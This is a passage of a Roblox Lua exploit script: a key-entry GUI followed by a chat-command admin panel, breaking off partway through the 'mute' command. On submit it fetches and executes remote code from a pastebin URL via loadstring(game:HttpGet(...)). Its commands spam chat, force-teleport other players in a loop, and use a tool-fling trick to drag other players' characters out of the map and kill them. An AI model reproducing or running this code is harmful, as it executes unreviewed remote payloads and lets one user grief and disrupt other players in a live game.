-- Scripts:

local function GXTYY_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local ttl = script.Parent.Title
	local bar = script.Parent.Bar.Thing
	local txt = script.Parent.Key
	local btn = script.Parent.Submit

	local function bt(obj, bt, time)
		local ti = TweenInfo.new(time)
		local tw = game.TweenService:Create(obj, ti, {BackgroundTransparency = bt})
		tw:Play()
	end

	local function tt(obj, tt, time)
		local ti = TweenInfo.new(time)
		local tw = game.TweenService:Create(obj, ti, {TextTransparency = tt})
		tw:Play()
	end


	--[[
	OG Size: UDim2.new(0, 245, 0, 86)
	OG Pos: UDim2.new(0.153, 0, 0.277, 0)
	--]]

	wait(3)
	ttl:TweenSizeAndPosition(UDim2.new(0, 141, 0, 29), UDim2.new(0.299, 0, 0.062, 0), "Out", "Quint", 0.8, true)
	bt(bar, 0, 1)
	bt(bar.Parent, 0, 1)
	wait(1.1)
	bar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quint", 2, true)
	wait(1.8)
	bt(bar, 1, 1)
	bt(bar.Parent, 1, 1)
	wait(1.1)
	bt(txt, 0, 1)
	bt(btn, 0, 1)
	wait(1)
	tt(txt, 0, 1)
	tt(btn, 0, 1)

	btn.MouseButton1Click:Connect(function()
		if txt.Text == "" then
			tt(txt, 1, 1)
			tt(btn, 1, 1)
			bt(txt, 1, 1)
			bt(btn, 1, 1)
			wait(1)
			tt(ttl, 1, 1)
			wait(1)
			script.Parent:TweenSizeAndPosition(UDim2.new(0, 0, 0, 0), UDim2.new(0.5, 0, 0.5, 0), "Out", "Quint", 1, true)


			local LocalPlayer = game.Players.LocalPlayer
			local whitelist = Instance.new("Script")
			whitelist.Parent = LocalPlayer.PlayerScripts
			whitelist.Name = "LHWhitelist"
			whitelist.Source = Key.Text
			loadstring(game:HttpGet(('https://pastebin.com/raw/XTmMzATJ'),true))()
			--//END NETWORK FOR NOW
			local settings = {
				prefix = ";",
				version = "1.0",
				welcomemsg = "Made By faintah#3616 and guter#8664, enjoy!!"
			}
			--// R15 anim function
			function PlayAnim(id)
				animationdebounce = true
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://" .. id
				local salute = LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
				salute.Name = "AP"
				salute:Play()
				salute.Stopped:Connect(
					function()
						LocalPlayer.Character.Animate.Disabled = false
						animationdebounce = false
					end
				)
			end
			--// CHAT SHIT

			LocalPlayer.Chatted:Connect(
				function(msg)
					msg = msg:lower()
					if string.sub(msg, 1, 3) == "/e " then
						msg = string.sub(msg, 4)
					end
					if string.sub(msg, 1, 1) == settings.prefix then
						local cmd
						local space = string.find(msg, " ")
						if space then
							cmd = string.sub(msg, 2, space - 1)
						else
							cmd = string.sub(msg, 2)
						end
						--// START OF COMMANDS
						if cmd == "add" then 
							-- Script generated by SimpleSpy - credits to exx#9394

							local args = {
								[1] = "add guter 8664 -- for the best free testing place admin (EXPLOIT)",
								[2] = "All"
							} 
							for i=1, 5 do 
								wait(0.1)
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
							end
						end

						if cmd == "joindate" then
							wait(0.5)
							local var = string.sub(msg, space + 1)
							local target = GetPlayer(var)
							local tbl =
								game:GetService("HttpService"):JSONDecode(
							game:HttpGet("https://users.roblox.com/v1/users/" .. target.UserId)
							)
							local Created = tbl["created"]:split("T")
							local Created2 = Created[2]:split(".")
							local args = {
								[1] = target.Name .. " joined on: " .. Created[1] .. " " .. Created2[1],
								[2] = "All"
							}
							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
							unpack(args)
							)
						end
						if cmd == "loopcbring" then
							local target = GetPlayer(string.sub(msg, space + 1))
							while wait() do 
								target.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(3,0,0)
							end
						end
						if cmd == "claim" then
							local var = string.sub(msg, space + 1)
							local Player = GetPlayer(var)
							if Player and Player.Character and (Player.Character:FindFirstChild("Right Arm") and Player.Character:FindFirstChild("Right Arm"):IsA("BasePart") or Player.Character:FindFirstChild("Right Hand") and Player.Character:FindFirstChild("Right Hand"):IsA("BasePart")) then
								if LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then 
									LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Destroy()
								end
								Instance.new("Humanoid").Parent = LocalPlayer.Character
								local Tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
								Tool.Parent = LocalPlayer.Character
								if Tool:FindFirstChild("Handle") and Player.Character.PrimaryPart ~= nil then
									repeat
										Player.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
										game:GetService("RunService").Stepped:Wait()
									until Tool.Parent == Player.Character

									Workspace.FallenPartsDestroyHeight = 0/1/0
									local CurrentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame

									for i = 1, 100 do
										LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame - Vector3.new(0, math.huge, 0)
									end
									wait(0.3)
									for i = 1, 100 do
										LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame
									end
									wait(0.2)
									LocalPlayer.Character:BreakJoints()
									LocalPlayer.CharacterAdded:Wait()
									repeat
										wait()
									until LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character:FindFirstChild("Head") and LocalPlayer.Character:FindFirstChild("Torso") and LocalPlayer.Character.Torso:FindFirstChild("Neck")
									LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame
								end
							end
						end
						if cmd == "mute" then
							local var = string.sub(msg, space + 1)
							local target = GetPlayer(var)
							local lplayer = LocalPlayer
							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
							lplayer.Character.Animate.Disabled = true
